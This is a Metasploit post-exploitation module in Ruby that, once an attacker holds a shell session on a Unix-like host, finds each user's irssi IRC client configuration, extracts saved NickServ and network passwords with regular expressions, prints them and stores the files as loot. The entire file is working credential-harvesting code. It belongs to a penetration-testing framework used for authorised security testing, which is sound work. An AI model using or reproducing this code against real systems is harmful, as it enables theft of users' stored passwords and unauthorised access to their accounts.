##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'Multi Gather IRSSI IRC Password(s)',
      'Description'  => %q{
        This module grabs IRSSI IRC credentials.
      },
      'Author'       => [
        'Jonathan Claudius <jclaudius[at]mozilla.com>',
      ],
      'Platform'     => %w{bsd linux osx unix},
      'SessionTypes' => %w{shell},
      'License'      => MSF_LICENSE
    ))
  end

  def run
    print_status('Finding ~/.irssi/config')
    paths = enum_user_directories.map { |d| d + '/.irssi/config' }
    paths = paths.select { |f| file?(f) }

    if paths.empty?
      print_error('No users found with a ~/.irssi/config file')
      return
    end

    download_passwords(paths)
  end

  # Example of what we're looking for in the config...
  #
  # ***Identify Password Example***
  # autosendcmd = "/msg nickserv identify example_password ;wait 2000";
  #
  # ***Network Password Example***
  #    password = "example_password";
  #
  def contains_passwords?(path)
    data = read_file(path)
    identify_passwords = data.scan(/\/\^?msg nickserv identify ([^\s]+)/)
    network_passwords = data.scan(/^?password = "([^\s]+)"/)

    passwords = identify_passwords.flatten + network_passwords.flatten

    if passwords.any?
      print_good("Found IRC password(s) of #{passwords.join(',')} in irssi config at #{path}")
      return true
    end

    false
  end

  def download_passwords(paths)
    print_status "Looting #{paths.count} files"

    paths.each do |path|
      path.chomp!
      next if ['.', '..'].include?(path)

      if contains_passwords?(path)
        loot_path = store_loot(
          'irssi config file',
          'text/plain',
          session,
          read_file(path),
          path,
          'IRC Password'
        )
        print_good("irssi config with passwords stored in #{loot_path}")
      end
    end
  end
end
